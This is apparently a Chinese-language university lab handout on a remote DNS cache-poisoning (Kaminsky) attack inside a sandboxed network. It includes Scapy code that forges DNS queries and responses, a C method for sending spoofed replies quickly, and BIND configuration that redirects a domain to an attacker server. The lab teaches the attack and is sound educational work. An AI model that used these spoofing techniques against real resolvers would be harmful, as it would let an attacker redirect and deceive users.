@@ -1,0 +1,241 @@
+4.3.3 解决 DNS 缓存效应：Kaminsky 攻击
+Kaminsky 攻击：Dan Kaminsky 提出了一种优雅的技术来克服缓存效应。
+通过 Kaminsky 攻击，攻击者将能够不需要等待而持续攻击同一个域名上的 DNS
+服务器，所以攻击可以在很短的时间内成功。攻击的细节在[1]中描述。在这个任
+务中，我们将尝试这种攻击方法。参照图 3 以下步骤概述了该攻击：
+1. 攻击者向 DNS 服务器 Apollo 查询 example.com 中不存在的名称，例如
+twysw.example.com，其中 twysw 是一个随机名称。
+2. 由于该映射在 Apollo 的 DNS 缓存中不可用，因此 Apollo 向 example.com
+域的名称服务器发送 DNS 查询。
+3. 当 Apollo 等待响应时，攻击者会向 Apollo 发送一个欺骗的 DNS 响应[6]
+流，每个响应都尝试一个不同的事务 ID，并希望其中一个是正确的。在响应中，
+攻击者不仅为 twysw.example.com 提供了一个 IP 解析，还提供了一个
+“ Authoritative Nameservers ”记录，指示 ns.dnslabattacker.net 作 为
+example.com 域的名称服务器。如果欺骗响应击败了实际响应，并且事务 ID 与
+查询中的事务 ID 匹配，Apollo 将接受并缓存欺骗响应，从而破坏 Apollo 的 DNS
+缓存。
+4. 即使欺骗 DNS 响应失败(例如,事务 ID 不匹配或者是太迟了),这并不重要,
+因为下一次,攻击者将查询一个不同的名称,所以 Apollo 发送另一个查询,给攻击
+者另一个机会做欺骗攻击。这有效地消除了缓存效果。
+5. 如果攻击成功，在 Apollo 的 DNS 缓存中，example.com 的名称服务器
+将被攻击者的名称服务器 ns.dnslabattacker.net 替换(学生做实验时，要求学生
+改成 ns.hust-cse.net)。为了证明这次攻击的成功，学生们需要证明这样的记录
+在 Apollo 的 DNS 缓存中。图 6 显示了中毒的 DNS 缓存的示例。
+图 6 DNS 缓存中毒成功后的示例
+实现 Kaminsky 攻击是相当具有挑战性的，因此将其分解为三个子任务：
+伪造 DNS 请求包、伪造 DNS 响应包、实施攻击。
+注意：（1）攻击首先需要 dns 对 www.example.com 有较为完整信息的缓
+存，才能进行进一步的实验，必须满足最终一次查询能够得到：1、
+www.example.com 的 ip ；2、授权域 example.com 的 ns 域名（有两个，必
+须完整得到）；3、两个 ns 域名的 ip（攻击目的就是伪造来自 ip 的响应）。只有
+user 在对 dns 查询 www.example.com 的查询结果满足上面条件时才可以进行
+实验。可以尝试多次查询，或者分步查询授权域和授权域的 ip。如果查询结果
+一直只显示很多根域名服务器信息，则很难进行实验。
+（2）攻击为概率攻击，在验证中尝试次数较多、花费时间较长，可能提升
+攻击成功率的方法为延迟发包：
+$sudo tc qdisc add dev br-29c63b220f5a root netem delay 100ms，延迟
+时间需要自己调整，dev 需要根据本次实验具体指定。
+1）子任务 1： 伪造 DNS 请求包：此子任务侧重于伪造 DNS 请求。为了
+完成攻击，我们（作为攻击者）需要触发目标 DNS 服务器发送 DNS 查询，因
+此我们就有机会欺骗 DNS 响应。这个过程需要多次尝试才能成功，因此必须
+自动化这个过程。第一步是编写一个程序，将 DNS 查询发送到目标 DNS 服务
+器，每次在查询字段中使用不同的主机名。我们的工作就是编写这个程序，并
+使用 Wireshark 查看发送的查询请求，触发目标 DNS 服务器来发送 DNS 查
+询。不需要很快地发送 DNS 查询，所以我们可以使用外部程序来完成这项工
+作，而不是在 C 程序中实现所有内容。例如，可以使用 system（）调用 dig 程
+序：
+system(“dig xyz.example.com”);
+也可以使用 python 实现，python 代码片段如下：（+++是占位符，学生需
+要替换它们）
+Qdsec = DNSQR(qname=’www.example.com’)
+dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0,
+qd=Qdsec)
+ip = IP(dst=’+++’, src=’+++’)
+udp = UDP(dport=+++, sport=+++, chksum=0)
+request = ip/udp/dns
+2）子任务 2：伪造 DNS 响应包：在 Kaminsky 攻击中，需要伪造 DNS 回
+复。我们的目标是 example.com，我们需要伪造从这个域名服务器的回应报
+文。学生需要找出 example.com 的合法域名服务器的 IP（需要注意的是，这
+个域可能有多个域名服务器）。
+可以用 scapy 来实现这个任务。下面的代码片段构造了一个 DNS 响应，
+包含请求的域名、answer 部分和 NS 部分。需要根据 Kaminsky 攻击的原理，
+替换代码中的+++部分。
+domain = ’+++’
+ns = ’+++’
+Qdsec = DNSQR(qname=name)
+Anssec = DNSRR(rrname=name, type=’A’, rdata=’1.2.3.4’, ttl=259200)
+NSsec = DNSRR(rrname=domain, type=’NS’, rdata=ns, ttl=259200)
+dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1,
+arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)
+ip = IP(dst=’+++’, src=’+++’)
+udp = UDP(dport=+++, sport=+++, chksum=0)
+reply = ip/udp/dns
+3）子任务 3：Kaminsky 攻击。现在我们可以把所有的东西放在一起进行
+Kaminsky 攻击。首先需要向 Apollo 发送 DNS 查询，在 example.com 域中查
+询一些随机主机名。每次查询发出后，攻击者需要在很短的时间内伪造大量的
+DNS 响应包，希望其中一个具有正确的事务 ID，并在真实响应之前到达目
+标。
+因此，速度至关重要：发送的数据包越多，成功率就越高。如果我们像在
+上一个任务中那样使用 Scapy 发送伪造的 DNS 响应，那么成功率太低了。学
+生可以使用 C 语言，但用 C 语言构建 DNS 数据包并非易事。我们介绍一种混
+合使用 Scapy 和 C 的方法。在混合方法中，我们首先使用 Scapy 生成一个
+DNS 数据包模板，该模板存储在文件中，然后我们在 C 程序中加载该数据模
+板，对一些字段做一些小的更改，然后把包发出去。我们提供了一个 C 代码框
+架，学生们可以在标记区域进行更改。详细信息查看第 5 节 指南部分。
+启动攻击，检查 dump.db 文件，查看你的欺骗 DNS 响应是否已被 DNS
+服务器成功接受。下面的命令转存了 DNS cache，可以在 cache 里搜索
+attacker(我们用 ns.dnslabattacker.net 作为攻击者的域名，如果学生的域名不
+是这个，搜索另外的关键词)
+#rndc dumpdb -cache && grep attacker /var/cache/bind/dump.db
+参见图 6 中的示例。
+4.3.4 攻击代码实现
+为了实施 Kaminsky 攻击，我们可以使用 Scapy 进行数据包欺骗。不幸的
+是， Python 的速度太慢，每秒生成的数据包数量太少，无法使攻击成功。最好
+使用 C 程序，但这对许多学生来说可能是一个很大的挑战，因为用 C 语言构建
+DNS 的数据包并不容易。推荐使用混合方法，使用这种方法，学生花在编码上
+的时间可以显著减少，因此他们可以花更多时间关注实际的攻击。
+这个方法是利用 Scapy 和 C 的优势：Scapy 构造 DNS 数据包比 C 快，但
+C 发包快得多。因此，我们只需使用 Scapy 创建伪造的 DNS 报文并将其保存到
+文件中，然后将数据包加载到 C 程序中。在 Kaminsky 攻击期间，尽管我们需要
+发送很多报文，但是这些数据包基本上是相同的，只有少数字段不一样。因此，
+我们可以使用 Scapy 生成的数据包作为基础，找到需要进行修改的偏移量（例
+如，事务 ID 字段），并进行更改。这比在 C 中创建整个 DNS 数据包容易得多。
+更改完成后，可以使用原始套接字发送包。
+下面的 Scapy 程序创建了一个简单的 DNS 应答包，并将其保存到一个文件
+中。
+Generate_dns_reply.py
+#!/usr/bin/env python3
+from scapy.all import *
+# Construct the DNS header and payload
+name = ’twysw.example.com’
+Qdsec = DNSQR(qname=name)
+Anssec = DNSRR(rrname=name, type=’A’, rdata=’1.1.2.2’, ttl=259200)
+dns = DNS(id=0xAAAA, aa=1, rd=0, qr=1,
+qdcount=1, ancount=1, nscount=0, arcount=0,
+qd=Qdsec, an=Anssec)
+# Construct the IP, UDP headers, and the entire packet
+ip = IP(dst=’10.10.27.2’, src=’1.2.3.4’, chksum=0)
+udp = UDP(dport=33333, sport=53, chksum=0)
+pkt = ip/udp/dns
+# Save the packet to a file
+with open(’ip.bin’, ’wb’) as f:
+f.write(bytes(pkt))
+在 C 程序中，我们从 ip.bin 文件加载数据包，并将其用作我们的数据包模
+板。基于这个模板我们创建许多类似的数据包，并向目标 DNS 服务器发送这些
+伪造的响应报文。
+对于每个回复，我们需要更改三个位置：事务 ID 和在两个位置的名称 twysw
+（问题部分和答案部分）。事务 ID 位于固定位置（从 IP 包开始，偏移量 28），
+但名称 twysw 的偏移量取决于域名的长度。我们可以使用二进制编辑器程序，
+如 bless，用于查看二进制文件 ip.bin 并找到 twysw 的两个偏移量。在我们的数
+据包中，它们位于偏移量 41 和 64。
+下面的代码片段显示了我们如何更改这些字段。我们在回复报文中将域名改
+为 bbbbb.example.com，然后发送伪造的 DNS 回复，事务 ID 为 1000。在代码
+中，变量 ip 指向 ip 数据包的开头。
+// Modify the name in the question field (offset=41)
+memcpy(ip+41, "bbbbb" , 5);
+// Modify the name in the answer field (offset=64)
+memcpy(ip+64, "bbbbb" , 5);
+// Modify the transaction ID field (offset=28)
+unsigned short id = 1000;
+unsigned short id_net_order = htons(id);
+memcpy(ip+28, &id_net_order, 2)
+生成随机名称。在 Kaminsky 攻击中，我们需要生成随机主机名。有很多方
+法可以做到这一点。下面的代码片段显示了如何生成一个由 5 个字符组成的随机
+名称。
+char a[26]="abcdefghijklmnopqrstuvwxyz";
+// Generate a random name of length 5
+char name[6];
+name[5] = 0;
+for (int k=0; k<5;k++)
+ name[k]=a[rand()%26];
+4.3.5 结果验证
+如果攻击成功，Apollo 的 DNS 缓存将如图 7 所示，即， example.com 的
+NS 记录就变成了 ns.dnslabattacker.net。为了确保袭击确实成功，我们在用户
+机器上运行 dig 命令来询问 www.example.com 的 IP 地址。
+当 Apollo 收到 DNS 查询时，它在缓存中搜索 example.com 的 NS 记录，
+并且找到 ns.dnslabattacker.net。因此，它将向 ns.dnslabattacker.net 发送 DNS
+查询。但是，在发送查询之前，它需要知道 ns.dnslabattacker.net 的 IP 地址。
+这是通过发出一个单独的 DNS 查询来完成的。这就是我们遇到麻烦的地方。
+域名 dnslabattacker.net 实际上并不存在。我们为这个实验的目的创建了这
+个名称。Apollo 很快就会发现这一点，并将 NS 条目标记为无效，然后就从中毒
+的缓存中恢复正常。有人可能会说，再伪造 DNS 响应时，我们可以使用额外的
+记录为 ns.dnslabattacker.net 提供 IP 地址。图 7 中的示例响应包实际上做到了
+这一点。不幸的是，这个额外的记录将不会被 Apollo 接受。请思考原因并在你
+的实验报告中给出你的解释。
+两种方法可以解决这个问题，所以我们可以显示我们缓存中毒攻击成功的影
+响(攻击确实成功了，问题是我们不能显示它):
+使用真实的域名：如果你一个真实的域，并且可以配置它的 DNS，那么你
+的工作很容易。只需在 NS 记录中使用你自己的域名，而不是 dnslabattacker.net。
+请参考本地 DNS 攻击的设置部分来配置 DNS 服务器，以便它能够回答
+example.com 域名的查询。
+使 用 假 域 名 ： 如 果没 有 真 正 的 域 名 ， 仍 然 可 以 使 用 我 们 的 假 域 名
+ns.dnslabattacker.net 进行演示。我们只需要在 Apollo 上做一些额外的配置，这
+样它就可以将 dnslabattacker.net 识别为一个真实的域。
+我们可以将 ns.dnslabattacker.net 的 IP 地址添加到 Apollo 的 DNS 配置中，
+因此 Apollo 不需要从一个不存在的域请求这个主机名的 IP 地址。
+（1）配置本地 DNS 服务器
+我们首先配置受害者的 DNS 服务器 Apollo。在/etc/bind/文件夹中找到
+named.conf.default-zones 文件，并添加以下条目:
+zone "ns.dnslabattacker.net" {
+type master;
+file "/etc/bind/db.attacker";
+};
+创建文件 /etc/bind/db.attacker ， 并 将 以 下 内 容 放 入 其 中 。 我 们 让
+ns.dnslabattacker.net 指向攻击者机器(10.10.27.1)。我们已经在实验网站链接了
+文件 db.attacker。
+;
+; BIND data file for local loopback interface
+;
+$TTL 604800
+@ IN SOA localhost. root.localhost. (
+ 2 ; Serial
+604800 ; Refresh
+ 86400 ; Retry
+2419200 ; Expire
+604800 ) ; Negative Cache TTL
+;
+@ IN NS ns.dnslabattacker.net.
+@ IN A 10.10.27.1
+@ IN AAAA ::1
+(上述红色标注的 ip 地址可以根据攻击者的实际 ip 修改)
+一旦设置完成，如果缓存中毒攻击成功，发送给 Apollo 的关于 example.com
+主机名的任何 DNS 查询都将被发送到攻击者的机器 10.10.27.1。
+（2）配置攻击者机器
+我们需要在 10.10.27.1 上配置 DNS 服务器，这样它就可以回答域
+example.com 的查询。在 10.10.27.1 的/etc/bin /named.conf.local 中添加以下条
+目：
+zone "example.com" {
+type master;
+file "/etc/bind/example.com.zone";
+};
+创建一个名为/etc/bind/example.com.zone 的文件，并使用以下内容填充它。
+$TTL 3D
+@ IN SOA ns.example.com. admin.example.com. (
+2008111001
+8H
+2H
+4W
+1D)
+@ IN NS ns.dnslabattacker.net.
+@ IN MX 10 mail.example.com.
+www IN A 1.1.1.1
+mail IN A 1.1.1.2
+*.example.com IN A 1.1.1.100
+配置完成后，不要忘记同时重启 Apollo 和攻击者的 DNS 服务器;否则，修
+改将不生效。
+配 置 成 功 的 话 ， 在 用 户 机 器 上 dig @ns.dnslabattacker.net
+www.example.com 这样的命令,答案将是 1.1.1.1，这正是我们放在上面文件中
+的。
+错误分析：如果上面的解析不成功，可以分别按照以下步骤来进行分析：
+1）在用户主机上 ping ns.dnslabattacker.net，是否能解析出攻击者主机的
+ip 10.10.27.1? 如果不能解析出来，则说明在本地 dns 服务器 10.10.27.3 上有
+关 dnslabattacker.net 的配置有误（可能是配置文件读权限问题，也可能是 db 文
+件格式错误或字符集错误）
+2）在用户主机上 dig @10.10.27.1 www.example.com，是否能解析出
+www.example.com 的 ip，如果不能，则说明攻击机的 DNS 配置存在问题。
+最后，缓存中毒攻击成功以后，在用户机上直接 dig www.example.com，可
+以得到 1.1.1.1 的地址。
+还可以 dig *.example.com，比如 dig abcd.example.com
+5 实验提交
+学生需要在实验平台上完成两个实验，本地 DNS 攻击实验和远程 DNS 攻
+击实验，完成相应的习题，提交得分。
